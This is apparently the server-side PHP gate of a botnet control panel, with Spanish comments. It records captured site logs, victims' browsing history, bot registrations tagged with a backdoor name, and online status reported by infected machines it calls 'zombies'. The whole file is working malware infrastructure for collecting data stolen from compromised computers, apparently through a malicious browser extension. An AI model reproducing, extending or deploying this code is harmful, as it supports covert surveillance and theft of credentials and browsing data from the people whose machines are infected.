<?php
require_once('includes/config.php');

if(isset($_GET['info']) && isset($_GET['url']) && $_GET['info'] != '' && $_GET['url'] != '' && isset($_GET['zname']) && $_GET['zname'] != '')
{
    $info = $_GET['info'];
    $url_check = $_GET['url'];
    $z_name = $_GET['zname'];

    //Inserta los datos obtenidos
    $insert = $bdd->prepare("INSERT INTO logs_checker(url_site,logs_site,zombie) VALUES(:url_site, :logs_site, :zombie)");
    $insert->bindParam(':url_site', $url_check);
    $insert->bindParam(':logs_site', $info);
    $insert->bindParam(':zombie', $z_name);
    $insert->execute();
    
    //Consulta si hay registro de pc conectadas en bots para modificar la cantidad de conectados.
    $select = $bdd->prepare('SELECT * FROM bots WHERE name = :name');
    $select->bindParam(':name', $z_name);
    $select->execute();
    $result = $select->fetch();
    if($result['name'] != ''){
        $update = $bdd->prepare("UPDATE bots SET numbers_logs = numbers_logs + 1 WHERE name = :name");
        $update->bindParam(':name', $z_name);
        $update->execute();
    }
}
elseif(isset($_GET['history']) && $_GET['history'] != '' && isset($_GET['zombie']) && $_GET['zombie'] != ''){
    $history = $_GET['history'];
    $zombie = $_GET['zombie'];
    $time = date('d-m-Y');

    //Inserta los valores obtenidos
    $insert = $bdd->prepare("INSERT INTO history_web(website, zombie, timevisit) VALUES(:website, :zombie, :time)");
    $insert->bindParam(':website', $history);
    $insert->bindParam(':zombie', $zombie);
    $insert->bindParam(':time', $time);
    $insert->execute();
}

elseif(isset($_GET['add']) && $_GET['add'] != '' && isset($_GET['version']) && $_GET['version'] != '')
{
    $zombie_name = $_GET['add'];
    $backdoor_name = $_GET['version'];

    //Consulta para verificar si esta vacio, sino introduce el los parametros
    $check = $bdd->prepare("SELECT * FROM bots WHERE name =:name");
    $check->bindParam(':name', $zombie_name);
    $check->execute();
    $result = $check->fetch();
    if($result['name'] == ''){
        $insert = $bdd->prepare("INSERT INTO bots(name,backdoor_name) VALUES(:name, :backdoor_name)");
        $insert->bindParam(':name', $zombie_name);
        $insert->bindParam(':backdoor_name', $backdoor_name);
        $insert->execute();
    }
}
elseif(isset($_GET['online']) && $_GET['online'] != ''){
    $zombie = $_GET['online'];
    //Para ver cuantos conectados hay (pc Con extension.)
    $online = $bdd->prepare("UPDATE bots SET online = '1' WHERE name = :name");
    $online->bindParam(':name', $zombie);
    $online->execute();
}
?>